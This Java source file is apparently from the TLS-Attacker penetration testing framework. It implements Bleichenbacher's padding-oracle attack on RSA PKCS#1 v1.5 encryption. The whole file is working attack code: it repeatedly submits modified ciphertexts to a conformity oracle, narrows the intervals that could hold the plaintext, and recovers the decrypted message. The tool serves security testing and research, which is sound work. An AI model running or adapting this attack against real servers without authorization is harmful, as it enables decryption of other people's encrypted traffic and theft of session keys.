/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.pkcs1;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.math.BigInteger;
import java.util.ArrayList;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Bleichenbacher algorithm.
 */
public class Bleichenbacher extends Pkcs1Attack {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     *
     */
    protected BigInteger s0;

    /**
     *
     */
    protected BigInteger si;

    /**
     *
     */
    protected Interval[] m;

    /**
     *
     */
    protected final boolean msgIsPKCS;

    /**
     *
     * @param msg
     * @param pkcsOracle
     * @param msgPKCScofnorm
     */
    public Bleichenbacher(final byte[] msg, final Pkcs1Oracle pkcsOracle, final boolean msgPKCScofnorm) {
        super(msg, pkcsOracle);
        this.msgIsPKCS = msgPKCScofnorm;
        c0 = BigInteger.ZERO;
        si = BigInteger.ZERO;
        m = null;
        // b computation
        int tmp = publicKey.getModulus().bitLength();
        tmp = (MathHelper.intceildiv(tmp, 8) - 2) * 8;
        bigB = BigInteger.ONE.shiftLeft(tmp);
    }

    /**
     *
     * @throws OracleException
     */
    public void attack() throws OracleException {
        int i = 0;
        boolean solutionFound = false;

        LOGGER.info("Step 1: Blinding");
        if (this.msgIsPKCS) {
            LOGGER.info("Step skipped --> " + "Message is considered as PKCS compliant.");
            LOGGER.info("Testing the validity of the original message");
            oracle.checkPKCSConformity(encryptedMsg);
            s0 = BigInteger.ONE;
            c0 = new BigInteger(1, encryptedMsg);
            m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
                    (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
        } else {
            stepOne();
        }

        i++;

        while (!solutionFound) {
            LOGGER.info("Step 2: Searching for PKCS conforming messages.");
            stepTwo(i);

            LOGGER.info("Step 3: Narrowing the set of solutions.");
            stepThree(i);

            LOGGER.info("Step 4: Computing the solution.");
            solutionFound = stepFour(i);
            i++;

            LOGGER.info("// Total # of queries so far: {}", oracle.getNumberOfQueries());
        }
    }

    /**
     *
     * @throws OracleException
     */
    protected void stepOne() throws OracleException {
        BigInteger n = publicKey.getModulus();
        BigInteger ciphered = new BigInteger(1, encryptedMsg);

        boolean pkcsConform;
        byte[] send;

        do {
            si = si.add(BigInteger.ONE);
            send = prepareMsg(ciphered, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);

        c0 = new BigInteger(1, send);
        s0 = si;
        // mi = {[2B,3B-1]}
        m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
                (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };

        LOGGER.debug(" Found s0 : " + si);
    }

    /**
     *
     * @param i
     * @throws OracleException
     */
    protected void stepTwo(final int i) throws OracleException {
        if (i == 1) {
            this.stepTwoA();
        } else {
            if (i > 1 && m.length >= 2) {
                stepTwoB();
            } else if (m.length == 1) {
                stepTwoC();
            }
        }

        LOGGER.debug(" Found s" + i + ": " + si);
    }

    /**
     *
     * @throws OracleException
     */
    protected void stepTwoA() throws OracleException {
        byte[] send;
        boolean pkcsConform;
        BigInteger n = publicKey.getModulus();

        LOGGER.debug("Step 2a: Starting the search");
        // si = ceil(n/(3B))
        BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
            si = tmp[0].add(BigInteger.ONE);
        } else {
            si = tmp[0];
        }

        // correction will be done in do while
        si = si.subtract(BigInteger.ONE);

        do {
            si = si.add(BigInteger.ONE);
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);
    }

    private void stepTwoB() throws OracleException {
        byte[] send;
        boolean pkcsConform;
        LOGGER.debug("Step 2b: Searching with more than" + " one interval left");

        do {
            si = si.add(BigInteger.ONE);
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);
    }

    /**
     *
     * @throws OracleException
     */
    protected void stepTwoC() throws OracleException {
        byte[] send;
        boolean pkcsConform;
        BigInteger n = publicKey.getModulus();

        LOGGER.debug("Step 2c: Searching with one interval left");

        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
        BigInteger ri = si.multiply(m[0].upper);
        ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));
        ri = ri.multiply(BigInteger.valueOf(2));
        ri = ri.divide(n);

        // initial si computation
        BigInteger upperBound = step2cComputeUpperBound(ri, n, m[0].lower);
        BigInteger lowerBound = step2cComputeLowerBound(ri, n, m[0].upper);

        // to counter .add operation in do while
        si = lowerBound.subtract(BigInteger.ONE);

        do {
            si = si.add(BigInteger.ONE);
            // lowerBound <= si < upperBound
            if (si.compareTo(upperBound) > 0) {
                // new values
                ri = ri.add(BigInteger.ONE);
                upperBound = step2cComputeUpperBound(ri, n, m[0].lower);
                lowerBound = step2cComputeLowerBound(ri, n, m[0].upper);
                si = lowerBound;
                // System.out.println("slower: " + lowerBound);
                // System.out.println("sgoal:  " +
                // (BigInteger.valueOf(3).multiply(bigB).add(ri.multiply(n))).divide(new
                // BigInteger(decryptedMsg)));
                // System.out.println("supper: " + upperBound);
            }
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
        } while (!pkcsConform);
    }

    private void stepThree(final int i) {
        BigInteger n = publicKey.getModulus();
        BigInteger r;
        BigInteger upperBound;
        BigInteger lowerBound;
        BigInteger max;
        BigInteger min;
        BigInteger[] tmp;
        ArrayList<Interval> ms = new ArrayList<>();

        for (Interval interval : m) {
            upperBound = step3ComputeUpperBound(si, n, interval.upper);
            lowerBound = step3ComputeLowerBound(si, n, interval.lower);

            r = lowerBound;
            // lowerBound <= r <= upperBound
            while (r.compareTo(upperBound) < 1) {
                // ceil((2*B+r*n)/si)
                max = (BigInteger.valueOf(2).multiply(bigB)).add(r.multiply(n));
                tmp = max.divideAndRemainder(si);
                if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
                    max = tmp[0].add(BigInteger.ONE);
                } else {
                    max = tmp[0];
                }

                // floor((3*B-1+r*n)/si
                min = BigInteger.valueOf(3).multiply(bigB);
                min = min.subtract(BigInteger.ONE);
                min = min.add(r.multiply(n));
                min = min.divide(si);

                // build new interval
                if (interval.lower.compareTo(max) > 0) {
                    max = interval.lower;
                }
                if (interval.upper.compareTo(min) < 0) {
                    min = interval.upper;
                }
                if (max.compareTo(min) <= 0) {
                    ms.add(new Interval(max, min));
                }
                r = r.add(BigInteger.ONE);
            }
        }

        LOGGER.debug(" # of intervals for M" + i + ": " + ms.size());
        m = ms.toArray(new Interval[ms.size()]);
    }

    private boolean stepFour(final int i) {
        boolean result = false;

        if (m.length == 1 && m[0].lower.compareTo(m[0].upper) == 0) {
            solution = s0.modInverse(publicKey.getModulus());
            solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());

            LOGGER.info("====> Solution found!\n {}", ArrayConverter.bytesToHexString(solution.toByteArray()));

            result = true;
        }

        return result;
    }

    private BigInteger step3ComputeUpperBound(final BigInteger s, final BigInteger modulus,
            final BigInteger upperIntervalBound) {
        BigInteger upperBound = upperIntervalBound.multiply(s);
        upperBound = upperBound.subtract(BigInteger.valueOf(2).multiply(bigB));
        // ceil
        BigInteger[] tmp = upperBound.divideAndRemainder(modulus);
        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
            upperBound = BigInteger.ONE.add(tmp[0]);
        } else {
            upperBound = tmp[0];
        }

        return upperBound;
    }

    private BigInteger step3ComputeLowerBound(final BigInteger s, final BigInteger modulus,
            final BigInteger lowerIntervalBound) {
        BigInteger lowerBound = lowerIntervalBound.multiply(s);
        lowerBound = lowerBound.subtract(BigInteger.valueOf(3).multiply(bigB));
        lowerBound = lowerBound.add(BigInteger.ONE);
        lowerBound = lowerBound.divide(modulus);

        return lowerBound;
    }

    /**
     *
     * @param r
     * @param modulus
     * @param upperIntervalBound
     * @return
     */
    protected BigInteger step2cComputeLowerBound(final BigInteger r, final BigInteger modulus,
            final BigInteger upperIntervalBound) {
        BigInteger lowerBound = BigInteger.valueOf(2).multiply(bigB);
        lowerBound = lowerBound.add(r.multiply(modulus));
        lowerBound = lowerBound.divide(upperIntervalBound);

        return lowerBound;
    }

    /**
     *
     * @param r
     * @param modulus
     * @param lowerIntervalBound
     * @return
     */
    protected BigInteger step2cComputeUpperBound(final BigInteger r, final BigInteger modulus,
            final BigInteger lowerIntervalBound) {
        BigInteger upperBound = BigInteger.valueOf(3).multiply(bigB);
        upperBound = upperBound.add(r.multiply(modulus));
        upperBound = upperBound.divide(lowerIntervalBound);

        return upperBound;
    }
}
